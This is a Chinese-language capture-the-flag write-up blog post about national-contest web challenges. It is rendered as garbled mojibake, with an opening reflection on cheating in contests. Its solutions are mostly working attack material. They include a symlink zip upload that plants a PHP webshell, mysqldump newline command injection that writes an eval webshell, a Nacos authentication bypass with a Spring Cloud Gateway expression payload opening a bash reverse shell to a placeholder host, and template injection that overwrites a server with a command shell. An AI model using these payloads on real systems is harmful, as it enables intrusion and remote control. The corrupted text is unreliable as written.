ä»¥åŠå›é¡¾ï¼Œé‚£ä¹ˆå½“ä¹‹åå†é‡åˆ°æ­¤ç±»å‹çš„é¢˜ç›®æ—¶å€™å°±ä¸è‡³äºä¸€å¤´é›¾æ°´ã€‚\n\né‚£ä¹ˆéš¾é¢˜ï¼Œå°±æˆ‘è‡ªå·±çš„çœ‹æ³•ï¼Œåœ¨æ¯”èµ›ä¸­åšä¸å‡ºæ¥çš„é¢˜ç›®åˆ™å°±æ˜¯éš¾é¢˜ï¼Œå½“ç„¶è¿™æ˜¯å­˜åœ¨å‰æï¼Œä¸€äº›äººä¸ºå¯¼è‡´çš„å‰æï¼Œæ¯”å¦‚ç”±äºå‡ºé¢˜äººçš„ä¸ä¸¥è°¨å¯èƒ½ä¸€é“å¾ˆç®€å•çš„è€ƒç‚¹ç¡¬æ˜¯è¦é€šè¿‡å»çŒœçš„æ–¹å¼æ‰èƒ½åšå‡ºæ¥ï¼Œæˆ–è€…å¤¹æ‚ç€å‡ºé¢˜äººè‡ªèº«è‰²å½©çš„é¢˜ç›®ï¼Œé¢˜ç›®ç»ˆå½’æ˜¯è¦å›å½’äºå¤§ä¼—ï¼Œé‚£ä¹ˆå—ä¼—ç¾¤ä½“åº”è¯¥æ˜¯åšé¢˜çš„äººï¼Œå¦‚æœé€šè¿‡å…ˆå»äº†è§£å‡ºé¢˜äººå†å»äº†è§£é¢˜ç›®ï¼Œè¿™å°±æœ‰ç‚¹æœ¬æœ«å€’ç½®äº†ï¼ˆè¿™é‡Œä¸»è¦æ˜¯æŒ‡WEBæ–¹å‘ï¼Œä¸ç¤¾å·¥ç›¸å¼‚ï¼‰ã€‚\n\næ‰€ä»¥çº¯æ˜¯çœ‹äº†WPè€Œè®¤ä¸ºæ˜¯ç®€å•é¢˜çš„ï¼Œå¯èƒ½åªæ˜¯é¢˜ç›®å¤æ‚åº¦æ¯”è¾ƒå°ï¼Œé™Œç”Ÿç¨‹åº¦æ¯”è¾ƒä½ï¼Œä½†æ˜¯æ€»å½’ æ¯”èµ›ä¸­åšä¸å‡ºæ¥çš„é¢˜ç›®é‚£å°±æ˜¯å¯¹äºè‡ªèº«çš„éš¾é¢˜ã€‚\n\nå†æ¥è°ˆè°ˆPY\n\nè¿™æ¬¡å›½èµ›PYç¨‹åº¦å ªç§°è®©æˆ‘ç ç›®ç»“èˆŒï¼Œå³ä¾¿åœ¨æˆ‘èº«è¾¹ä¹Ÿå­˜åœ¨ã€‚\n\nå½“ç„¶ï¼Œæˆ‘ä¹Ÿå­˜åœ¨ã€‚\n\næˆ‘æ€»æ˜¯åœ¨ä¸€äº›æ¯”èµ›ä¸­ï¼Œåšé¢˜åšç€åšç€ï¼Œçªç„¶å°±æ²¡äº†æ€è·¯ï¼Œç„¶åå°±æƒ³é—®é—®å…¶ä»–äººä¸€äº›æ€è·¯ï¼Œæ€»æ˜¯æƒ³ç€ä¹Ÿè®¸æˆ‘è·å–ä¸€ç‚¹å¸®åŠ©å°±èƒ½åšå‡ºæ¥å‘¢ï¼ˆå› ä¸ºæˆ‘è¿™ä¸ªäººæ€»æ˜¯æ¯”è¾ƒçˆ±é’»ç‰›è§’å°–ï¼Œæœ‰æ—¶å€™ä¼šåœ¨ä¸€äº›æ²¡æ„ä¹‰çš„åœ°æ–¹åœç•™å¾ˆä¹…ï¼‰ï¼Œå…¶å®æˆ‘è®¤ä¸ºè¿™ç§åªæ˜¯è·å–ä¸€ç‚¹æ€è·¯çš„å¸®åŠ©ï¼Œè™½ç„¶ä¸å¯¹ï¼Œä½†æ˜¯ä¸ä¼šå¾ˆæ¶åŠ£ï¼Œä»–å…·æœ‰ä¸€å®šçš„ç§¯ææ€§è´¨ï¼Œå¯èƒ½é€šè¿‡å¯»æ±‚ä¸€ç‚¹æ€è·¯å°±æŠŠè¿™é“é¢˜ç›®åšå‡ºæ¥ï¼Œé‚£ä¹ˆæ­£å‘åé¦ˆæ˜¯å¾ˆå®¢è§‚çš„ã€‚ç›¸æ¯”äºæ›´ä¸ºå—äººå”¾å¼ƒçš„åˆ™æ˜¯ï¼Œä¸€ç‚¹ä¸äº†è§£é¢˜ç›®ç”šè‡³æ˜¯æ²¡æœ‰ä»”ç»†å®¡é¢˜ï¼Œç›´æ¥å»PYåšæ³•çš„ï¼Œæˆ‘è§‰å¾—è¿™ç§è¡Œä¸ºåšæ³•å¹¶æ²¡æœ‰ä¸€ç‚¹å®é™…æ„ä¹‰ï¼Œæœ¬æ¥CTFå°±æ˜¯ä»¥èµ›ä¿ƒå­¦ï¼Œæœ€ç»ˆç›®çš„æ˜¯æŒæ¡è¿™ä¸ªçŸ¥è¯†ï¼Œè€Œä¸æ˜¯æ’åï¼Œå½“ç„¶éšç€å•†ä¸šåŒ–æ¨¡å¼çš„ä¾µèš€ä¸åœ¨å½“ä»Šç¤¾ä¼šä¸‹æµ®èºçš„å¿ƒæ€ï¼Œé™ä¸‹å¿ƒæ¥å­¦ä¹ æ˜¯ä¸€ä»¶éš¾èƒ½å¯è´µçš„äº‹æƒ…ã€‚\n\nä¸¾ä¸ªç®€å•çš„ä¾‹å­æ¯”å¦‚Flaskçš„SSTIï¼Œpayloadæœ‰å¾ˆå¤šï¼Œä¸€å¼€å§‹æˆ‘è®¤ä¸ºç›´æ¥ç”¨ä¸€ä¸ªè„šæœ¬å»æ³¨å…¥ï¼Œä¸æ˜¯å¾ˆæ–¹ä¾¿å¾ˆç®€å•å˜›ï¼Œä½†æ˜¯å¦‚æœé¢˜ç›®ç¨ç¨å˜åŠ¨ï¼Œé‚£ä¹ˆè„šæœ¬çš„å±€é™æ€§è´¨å°±ä¼šä½“ç°å‡ºæ¥ï¼Œæ¯•ç«Ÿè„šæœ¬æ˜¯äººä¸ºæå‰ç¼–è¯‘å¥½çš„ï¼Œé¢˜ç›®ç¨ç¨æ”¹åŠ¨åŠ ä¿®æ”¹å°±ä¼šè®©è„šæœ¬æ— æ³•ç”¨ã€‚å½“ç„¶ï¼Œå¯¹äºå·²ç»æŒæ¡äº†è¿™ä¸ªçŸ¥è¯†çš„å¤§ä½¬ï¼Œé€šè¿‡è„šæœ¬å®ç°ä¸€äº›å¯¹ä»–è€Œè¨€æ— æ„ä¹‰çš„æœºæ¢°é‡å¤å¼çš„æ“ä½œï¼Œä¹Ÿæ˜¯æ²¡æ¯›ç—…çš„ï¼Œæ¯•ç«Ÿå¤§ä½¬ä¼šï¼Œåªæ˜¯ä¸€ä¸ªåšä¸ä¸åšçš„é—®é¢˜ã€‚è€Œå¯¹æˆ‘ï¼Œå¹¶æ²¡æœ‰ç†Ÿç»ƒçš„æŒæ¡ï¼Œå´é€è¿‡è„šæœ¬å¹²ä¸€äº›æœ¬æœ«å€’ç½®çš„äº‹æƒ…æ˜¯æ¯«æ— æ„ä¹‰çš„ã€‚\n\næœ€åï¼Œæˆ‘è®¤ä¸ºwebæ˜¯ä¸€ä¸ªéœ€è¦æ²‰æ·€çš„æ–¹å‘ï¼Œä»–éœ€è¦å¤§é‡çš„åŸºç¡€åŠŸåº•ä»¥åŠè¯­è¨€åŠŸåº•ï¼Œæˆ‘åªæ˜¯ä¸€ä¸ªæ™®é€šäººæ— æ³•åšåˆ°çŸ­æ—¶é—´å°±èƒ½æ‹¿åˆ°æˆ‘è‡ªå·±è®¤ä¸ºæœ‰ä»·å€¼çš„æ’åä¹Ÿå¥½ï¼Œå¥–é¡¹ä¹Ÿå¥½ï¼Œåªèƒ½è¯´ä»»é‡è€Œé“è¿œã€‚\n\nä»¥ä¸Šåªæ˜¯æˆ‘å•æ–¹é¢çš„èµ›åæƒ³æ³•ä»¥åŠæ€»ç»“ï¼Œåªæ˜¯ç”¨æ¥é­ç­–ä¸æé†’æˆ‘è‡ªå·±ä¸å¿˜åˆå¿ƒï¼Œå¸Œæœ›æœªæ¥èƒ½æ›´å¥½ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685547094038-d6d9bea7-62c7-47b3-830a-1b9ac0671965.jpeg)\n\n# WEB\n\n## UNZIP\n\nè€ƒç‚¹ï¼šè½¯é“¾æ¥\n\nè¿™æ˜¯ä¸€é“2021æ·±è‚²æ¯çš„åŸé¢˜  https://xz.aliyun.com/t/10533#toc-4\n\né¦–å…ˆæ˜¯ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685371919081-97f89941-b813-493c-a0a6-dc9c9cd10df2.png)\n\nä¹‹åç»™äº†æºç ï¼š\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\nif (finfo_file($finfo, $_FILES[\"file\"][\"tmp_name\"]) === 'application/zip'){\n    exec('cd /tmp && unzip -o ' . $_FILES[\"file\"][\"tmp_name\"]);\n};\n```\n\nåˆ†ææºç  æˆ‘ä»¬ä¸Šä¼ ä¸Šå»çš„å‹ç¼©åŒ…ä¼šè¢«ä¿®æ”¹ä¸ºtmp_name å¹¶ä¸”è·¯å¾„æ˜¯/tmpæˆ‘ä»¬ä¹Ÿæ˜¯è®¿é—®ä¸åˆ°çš„\n\næˆ‘ä»¬èƒ½è®¿é—®åˆ°çš„åªèƒ½æ˜¯é»˜è®¤webç¯å¢ƒä¸‹ ä¹Ÿå°±æ˜¯/var/www/html\n\nå†æ ¹æ®é¢˜ç›®æè¿°æ˜¯unzipæ‰€å¯¼è‡´çš„é—®é¢˜ \n\nçœ‹äº†wp æ˜¯æ ¹æ®è½¯é“¾æ¥è¿™é‡Œå¯ä»¥ç†è§£ä¸ºæ˜¯winçš„å¿«æ·æ–¹å¼\n\nå…ˆæ¥çœ‹`unzip -o`è¿™æ˜¯è¿™é“é¢˜çš„å‰æ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685372533414-f6c6b521-1d9d-43f8-bafc-f94ea40e22d0.png)\n\næˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡è§£å‹è¦†ç›–åŸæœ‰çš„æ–‡ä»¶\n\næˆ‘ä»¬å¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æ–‡ä»¶test æŒ‡å‘/var/www/html ç„¶åæ‰“åŒ…test.zipä¸Šä¼ ä¸Šå»\n\n `ln -s /var/www/html test`\n\n\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373327803-af16dd07-a6f5-4219-a6ae-1f78d17dc4ab.png)\n\nè¿™é‡Œçš„**ç¬¦å·é“¾æ¥å…¶å®å°±æ˜¯è½¯é“¾æ¥**\n\n```\nzip -y test.zip test\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373416181-10436723-6c28-4452-9cb2-34facb735c6b.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373504644-d86c7ed4-d3ef-4c2e-a63b-39aa142ffbca.png)\n\nå†å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ æ”¾åˆ°testæ–‡ä»¶ä¸­ æ‰“åŒ…test2.zipä¸Šä¼ ä¸Šå»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373611970-09deda72-3b51-43b9-91d3-f689aed9ad94.png)\n\n```\nzip -r test2.zip test\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373698097-122e454b-4967-4295-a0d2-e6d4097fda8f.png)\n\nå› ä¸ºæ˜¯testæ–‡ä»¶ä¸‹æœ‰ä¸ªtest.phpï¼ˆæˆ‘ä»¬çš„æœ¨é©¬ï¼‰ æ‰€ä»¥è¦é€’å½’å¤„ç†\n\nå½“test.zipè¢«è§£å‹å ä¼šæœ‰ä¸€ä¸ªæŒ‡å‘/var/www/html çš„è½¯é“¾æ¥æ–‡ä»¶test ç„¶åæ¥ç€test2.zipè¢«è§£å‹å åŒåè½¯é“¾æ¥æ–‡ä»¶test ä¼šè¢«è¦†ç›–ç„¶å  ä½†æ˜¯testç›®å½•è½¯é“¾æ¥æŒ‡å‘/var/www/html è§£å‹çš„æ—¶å€™ä¼šæŠŠtestæ–‡ä»¶ä¸­çš„test.phpæ”¾åœ¨/var/www/htmlï¼Œæ­¤æ—¶æˆ‘ä»¬è¾¾åˆ°äº†getsehllçš„ç›®çš„ï¼Œè¿™é‡Œæ€è·¯ä¸€å®šè¦æ‹æ¸…ã€‚\n\nç„¶åè®¿é—®`/test.php`å³å¯\n\n## dumpit\n\nä¸€é“mysqldump rceçš„é¢˜ç›® è·Ÿsqlæ³¨å…¥æ²¡ä¸€ç‚¹å…³ç³» é¢˜ç›®ä¸­ä¹Ÿæç¤ºäº† rce \n\næˆ‘åƒä¸ªé“¸å¸ä¸€æ ·ä¸€ç›´åœ¨è¯•é—­åˆæ–¹å¼å»æ„é€ å¥‡æ€ªçš„æ³¨å…¥ç‚¹ æˆ‘è„‘å­æœ‰é—®é¢˜æ˜¯å§\n\n### éé¢„æœŸ\n\nå…¶å®è¿™é“é¢˜ç›®å¯¹æˆ‘æ¥è¯´rceç‚¹æˆ‘æ‰¾ä¸åˆ° è¿™æ˜¯ä¸€ä¸ªè§å¤šè¯†å¹¿çš„ç»“æœ\n\næ ¹æ®å¤§ä½¬çš„wp dumpå‡ºæ—¥å¿—å…¶å®æ˜¯é€šè¿‡å‘½ä»¤æ‰§è¡Œå®ç°çš„ ï¼Œæˆ‘ä»¬çœ‹çš„é‚£ä¸ªæ—¥å¿—åŠŸèƒ½å¤§æ¦‚ç‡ä¸æ˜¯æ—¥å¿—ï¼Œè€Œæ˜¯mysqldumpè¿™ä¸ªå·¥å…·ç”¨æ¥å¤‡ä»½æ•°æ®åº“çš„ï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥ç›´æ¥æ‰§è¡Œçš„ç¨‹åºå‘½ä»¤ï¼Œæ‰€ä»¥èƒ½æ¢è¡Œç¬¦RCE \n\né€šè¿‡æ¢è¡Œç¬¦`%0a`ç»•ä¸€ä¸‹\n\nç„¶åç›´æ¥rce å¦‚æœç›´æ¥è¯»flagæ˜¯ä¸è¡Œçš„ ä¼°è®¡é¢„æœŸè§£è¦æ¶‰åŠææƒé—®é¢˜ \n\nä½†æ˜¯å‡ºé¢˜äººè¿™é‡Œæ²¡æœ‰æŠŠç¯å¢ƒå˜é‡åˆ äº† å¯¼è‡´ç›´æ¥è¯»ç¯å¢ƒå˜é‡å°±å‡ºäº†\n\n```\n?db=ctf&table_2_dump=%0Aenv\n```\n\nè¿˜æœ‰å¦ä¸€ç§æ˜¯\n\n```\n?db=ctf&table_2_dump=flag1%0aecho \"<?php @eval(getallheaders()['Cookie'])?>\" > \"/app/log/1.php\"\n```\n\nè¿™é‡Œè¿‡æ»¤äº†`$`å¯ä»¥é€šè¿‡`getallheaders()`æˆªå–è¯·æ±‚å¤´æ–¹å¼bypass\n\nè¿™ç§åšæ³•å…¶å®æˆ‘æœ€æƒ³é—®è¿™ä¸ª/app/logè·¯å¾„æ˜¯æ€ä¹ˆæ¥çš„ \n\næˆ‘å½“æ—¶åšé€šè¿‡æŠ¥é”™åªèƒ½è·å–çš„è·¯å¾„åªæœ‰`/log`\n\n## BackendService\n\nè€ƒç‚¹ï¼šä¸€é“ç»“åˆèº«ä»½è®¤è¯ç»•è¿‡å’ŒNacosç»“åˆSpring Cloud Gateway RCEåˆ©ç”¨çš„é¢˜ç›® \n\né¦–å…ˆæ˜¯Nacosèº«ä»½è®¤è¯ç»•è¿‡æ¼æ´ å‚è€ƒhttps://www.secpulse.com/archives/199642.html\n\nè¿™é“é¢˜ç›®å¤ç°ç¯å¢ƒæ˜¯åœ¨ctfshowä¸‹ å½“æ—¶å›½èµ›èº«ä»½è®¤è¯ç»•è¿‡å‚è€ƒçš„æ˜¯https://www.secpulse.com/archives/199642.html\n\nè¿™é‡Œç¨ç¨ä¸åŒ\n\nè¯·æ±‚åŒ…å¦‚ä¸‹ï¼š\n\n```php\nPOST /v1/auth/users HTTP/1.1\nHost: 9b464143-e8ce-4ca3-a70c-25ee32dc6c66.challenge.ctf.show\nContent-Length: 27\nAccept: application/json, text/plain, */*\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nOrigin: http://9b464143-e8ce-4ca3-a70c-25ee32dc6c66.challenge.ctf.show\nReferer: http://9b464143-e8ce-4ca3-a70c-25ee32dc6c66.challenge.ctf.show/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: _ga=GA1.2.729509020.1680361470\nConnection: close\n\nusername=test&password=test\n```\n\nä¹‹åæ¥åˆ°åå°\n\næ¥ç€å°±æ˜¯è·Ÿç€https://xz.aliyun.com/t/11493#tocå¤ç° åŠ¨æ€é…ç½®è·¯ç”±è¾¾åˆ°RCE\n\næ·»åŠ ä¸€ä¸ªé…ç½®\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685460978092-86e17559-963c-4cee-8180-0b9b65121836.png)\n\nè¿™é‡Œæ·»åŠ æ—¶Data ID è¦æ ¹æ®é¢˜ç›®ç»™çš„é™„ä»¶ å»æŸ¥çœ‹javaæºç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685461072802-d7056ff3-982c-4bb1-b1e6-d09e4c1a63c3.png)\n\né…ç½®å†…å®¹å‚è€ƒå‰é¢æ–‡ç« ä¸­çš„ \n\n```yaml\nspring:\n  cloud:\n    gateway:\n      routes:\n        - id: exam\n          order: 0\n          uri: lb://service-provider\n          predicates:\n            - Path=/echo/**\n          filters:\n            - name: AddResponseHeader\n              args:\n                name: result\n                value: \"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'id'}).getInputStream())).replaceAll('\\n','').replaceAll('\\r','')}\"\n```\n\nä½†æ˜¯æ ¼å¼è¦è½¬ä¸ºjsonæºç ä¸­ä¹Ÿæåˆ°äº†\n\næ³¨æ„è¿™é‡ŒåŸæ–‡ç« ç»™çš„payloadæ ¼å¼æ˜¯yaml æ ¹æ®æºç éœ€è¦jsonæ ¼å¼ æ‰¾ä¸ªåœ¨çº¿ç½‘ç«™è½¬ä¸€ä¸‹æ ¼å¼å³å¯\n\nè¿™é‡Œæˆ‘ä¸€å¼€å§‹è¿™ä¸ªpayload æ ¼å¼ çœ‹æ¥çœ‹å»éš¾é“è¦æ‰‹åŠ¨è½¬jsonæ ¼å¼å— äºè´¼ï¼Œè€Œä¸”è¿™ä¸ªæ ¼å¼å¥½çœ¼ç†Ÿï¼Œä¹‹åå¥½å¥½æƒ³äº†ä¸€ä¸‹åŸæ¥æ˜¯çœèµ›çš„æ—¶å€™å‘¢åˆ°yamlååºåˆ—åŒ– å­¦è¿‡è¿™ä¸ªæ ¼å¼ æˆ‘å°±è¯´æ ¼å¼å¥½çœ¼ç†Ÿå•Š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685461002172-6b4caeae-7103-4aa0-ac22-28ae200aba08.png)\n\n```json\n{\n  \"spring\":{\n    \"cloud\":{\n      \"gateway\":{\n        \"routes\":[\n          {\n            \"id\":\"exam\",\n            \"order\":0,\n            \"uri\":\"lb://backendservice\",\n            \"predicates:\":[\n              \"Path=/test/**\"\n            ],\n            \"filters\":[\n              {\n                \"name\":\"RewritePath\",\n                \"args\":{\n                  \"replacement\":\"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','bash -i >& /dev/tcp/ip/port 0>&1'}).getInputStream())).replaceAll('\\n','').replaceAll('\\r','')}\"\n                }\n              }\n            ]\n          }\n        ]\n      }\n    }\n  }\n}\n```\n\nåå¼¹shell å³å¯  ä½†æ˜¯æœ‰æ—¶å€™å¼¹ä¸æˆåŠŸ ç¯å¢ƒé—®é¢˜\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685462609893-09c39cf1-624e-4597-8b3b-9751bc72f3e6.png)\n\n\n\n## go_session\n\næºç å¦‚ä¸‹ï¼š\n\n```go\npackage route\n\nimport (\n    \"github.com/flosch/pongo2/v6\"\n    \"github.com/gin-gonic/gin\"\n    \"github.com/gorilla/sessions\"\n    \"html\"\n    \"io\"\n    \"net/http\"\n    \"os\"\n)\n\nvar store = sessions.NewCookieStore([]byte(os.Getenv(\"SESSION_KEY\")))\n\nfunc Index(c *gin.Context) {\n    session, err := store.Get(c.Request, \"session-name\")\n    if err != nil {\n        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n        return\n    }\n    if session.Values[\"name\"] == nil {\n        session.Values[\"name\"] = \"guest\"\n        err = session.Save(c.Request, c.Writer)\n        if err != nil {\n            http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n            return\n        }\n    }\n\n    c.String(200, \"Hello, guest\")\n}\n\nfunc Admin(c *gin.Context) {\n    session, err := store.Get(c.Request, \"session-name\")\n    if err != nil {\n        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n        return\n    }\n    if session.Values[\"name\"] != \"admin\" {\n        http.Error(c.Writer, \"N0\", http.StatusInternalServerError)\n        return\n    }\n    name := c.DefaultQuery(\"name\", \"ssti\")\n    xssWaf := html.EscapeString(name)\n    tpl, err := pongo2.FromString(\"Hello \" + xssWaf + \"!\")\n    if err != nil {\n        panic(err)\n    }\n    out, err := tpl.Execute(pongo2.Context{\"c\": c})\n    if err != nil {\n        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n        return\n    }\n    c.String(200, out)\n}\n\nfunc Flask(c *gin.Context) {\n    session, err := store.Get(c.Request, \"session-name\")\n    if err != nil {\n        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n        return\n    }\n    if session.Values[\"name\"] == nil {\n        if err != nil {\n            http.Error(c.Writer, \"N0\", http.StatusInternalServerError)\n            return\n        }\n    }\n    resp, err := http.Get(\"http://127.0.0.1:5000/\" + c.DefaultQuery(\"name\", \"guest\"))\n    if err != nil {\n        return\n    }\n    defer resp.Body.Close()\n    body, _ := io.ReadAll(resp.Body)\n\n    c.String(200, string(body))\n}\n```\n\nçœ‹äº†æºç å‘ç°è¦è¿›è¡Œsessionä¼ªé€ ï¼Œå½“æ—¶åšé¢˜çš„æ—¶å€™ä»¥ä¸ºç±»ä¼¼äºfalskçš„sessionä¼ªé€  å»ç½‘ä¸Šæ‰¾è„šæœ¬ ä½†æ˜¯éƒ½æ²¡è¿è¡ŒæˆåŠŸ å¹¶ä¸”ä¹Ÿä¸çŸ¥é“key å°±å¯„äº†\n\nå¤ç°çš„æ—¶å€™çœ‹äº†å¤§ä½¬çš„WP keyæ˜¯ç©ºå€¼ éº»äº† è¿™é‡Œå°±éœ€è¦æœ¬åœ°æ¥æ­å»ºä¸€ä¸‹ æ­¤å‰é›¶æ¥è§¦go æ‰€ä»¥æ­å»ºå¾ˆè´¹åŠ› è¯·äº†äº®senseiå¸®æˆ‘å¼„ \n\næ­å»ºå¥½æœ¬åœ°ç¯å¢ƒä¹‹å \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685710841251-127825a0-1f2b-400c-bda0-f3588de2f64d.png)\n\nä¿®æ”¹è¿™ä¸¤ä¸ªåœ°æ–¹ æœ¬åœ°å¯åŠ¨æŠ“åŒ… å°†session å¤åˆ¶åˆ°é¢˜ç›®ä¸Šå»ç›´æ¥å°±å¯ä»¥äº†ï¼ˆè¿™é‡Œæ³¨æ„è¦åˆ é™¤åŸæ¥çš„session ç„¶ååˆ·æ–°ä¸€ä¸‹ï¼‰\n\n```\nMTY4NTcwODk3NnxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXxfaogJnkxqBjr0zeT-y8vTmXMwFnxOaUC4_0fBoWEhUA==\n```\n\nç„¶åå°±æœ‰ä¸¤ä¸ªæ¥å£`/admin``/flask`\n\nå›½èµ›ç¯å¢ƒä¸‹å½“æ—¶`/flask?name=/`å°±ä¼šæŠ¥é”™ æŠ¥é”™ç•Œé¢æš´éœ²å¯ä»¥ç®—pinç ï¼Œä¹Ÿå°±æ˜¯debugå¼€å¯çš„ï¼Œä½†æ˜¯è¿™é“é¢˜ç›®æ²¡æ³•é€šè¿‡ç®—pinç æ¥åšå‡ºæ¥ çœ‹äº®å¸ˆå‚…wpæ˜¯å› ä¸ºè¿™é“é¢˜ç›®å¯ä»¥æ–‡ä»¶çƒ­éƒ¨ç½²ï¼ˆä¹Ÿå°±æ˜¯ä¸ç”¨é€šè¿‡é‡æ–°ç¼–è¯‘æ¥è¾¾åˆ°æ›´æ–°ç›®çš„ åå°ç›´æ¥ä¿®æ”¹æ›´æ–°å³å¯ï¼‰\n\nå†æ¥çœ‹`/admin`\n\n```go\nfunc Admin(c *gin.Context) {\n\tsession, err := store.Get(c.Request, \"session-name\")\n\tif err != nil {\n\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tif session.Values[\"name\"] != \"admin\" {\n\t\thttp.Error(c.Writer, \"N0\", http.StatusInternalServerError)\n\t\treturn\n\t}\n\tname := c.DefaultQuery(\"name\", \"ssti\")\n\txssWaf := html.EscapeString(name)\n\ttpl, err := pongo2.FromString(\"Hello \" + xssWaf + \"!\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tout, err := tpl.Execute(pongo2.Context{\"c\": c})\n\tif err != nil {\n\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tc.String(200, out)\n}\n```\n\n`tpl, err := pongo2.FromString(\"Hello \" + xssWaf + \"!\")`ç›´æ¥æ¥çœ‹è¿™é‡Œ å°±æ˜¯æ¨¡æ¿æ³¨å…¥pongo2çš„æ¨¡æ¿æ³¨å…¥\n\n```\nout, err := tpl.Execute(pongo2.Context{\"c\": c})\n```\n\n`tpl.execute`æŠŠcä¹Ÿæ”¾è¿›å»äº†çš„ï¼Œè¿™ä¸ªcä»£è¡¨ç€giné‡Œçš„ä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œå¯ä»¥å¼•ç”¨Contextä¸‹çš„æ‰€æœ‰å‡½æ•°äº† \n\n  gin.Context é‡Œé¢åŒ…è£…äº† Request å’Œ ResponseWriter, è¿™é‡Œå¤§ä½¬çš„WPç”¨çš„ `Request.UserAgent()`\n\n```go\n// UserAgent returns the client's User-Agent, if sent in the request.\nfunc (r *Request) UserAgent() string {\n\treturn r.Header.Get(\"User-Agent\")\n}\n```\n\npayload: `{{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())}}`\n\nå·çš„å¤§ä½¬çš„æ•°æ®åŒ… ç›´æ¥è¦†ç›–æºç  server.py\n\n```html\nGET /admin?name={{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())}} HTTP/1.1\nHost: node1.anna.nssctf.cn:28272\nContent-Length: 611\nCache-Control: max-age=0\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryrxtSm5i2S6anueQi\nUser-Agent: /app/server.py\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nCookie: session-name=MTY4NTE1ODc3OHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzlZGsWROWLHoCNn0Pbu3SkgRLWCZRrj8UIHVYgHU7GPw==\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nConnection: close\n\n------WebKitFormBoundaryrxtSm5i2S6anueQi\nContent-Disposition: form-data; name=\"/app/server.py\"; filename=\"server.py\"\nContent-Type: text/plain\n\nfrom flask import Flask, request\nimport os\n\napp = Flask(__name__)\n\n@app.route('/shell')\ndef shell():\ncmd = request.args.get('cmd')\nif cmd:\nreturn os.popen(cmd).read()\nelse:\nreturn 'shell'\n\nif __name__== \"__main__\":\napp.run(host=\"127.0.0.1\",port=5000,debug=True)\n------WebKitFormBoundaryrxtSm5i2S6anueQi\nContent-Disposition: form-data; name=\"submit\"\n\n&#25552;&#20132;\n------WebKitFormBoundaryrxtSm5i2S6anueQi--\t\n```\n\n`/flask?name=/shell?cmd=ls${IFS}/` è¿™é‡Œè¿‡æ»¤äº†ç©ºæ ¼\n\nå‘½ä»¤æ‰§è¡Œå°±è¡Œäº† tql è¿™é‡Œå…¶å®è¿˜æœ‰å¾ˆå¤šçŸ¥è¯† è¿™é‡Œä¸å¤ªæ‡‚è¯´èµ·æ¥å¾ˆéš¾å— ä»¥åå†å¼ºç‚¹ å†æ¥è¡¥å‘å§ \n\n\n\nWebå°±åˆ°è¿™é‡Œ å…¶ä»–é¢˜ç›®å¯¹äºæˆ‘æ¥è¯´è¿˜åœ¨æœªçŸ¥é¢†åŸŸç­‰æˆ‘å»æ¢ç´¢ã€‚\n\n# MISC\n\n## ç­¾åˆ°\n\næ ¹æ®æç¤º`print(open('flag').read())`å°±å‡ºäº†\n\n## **è¢«åŠ 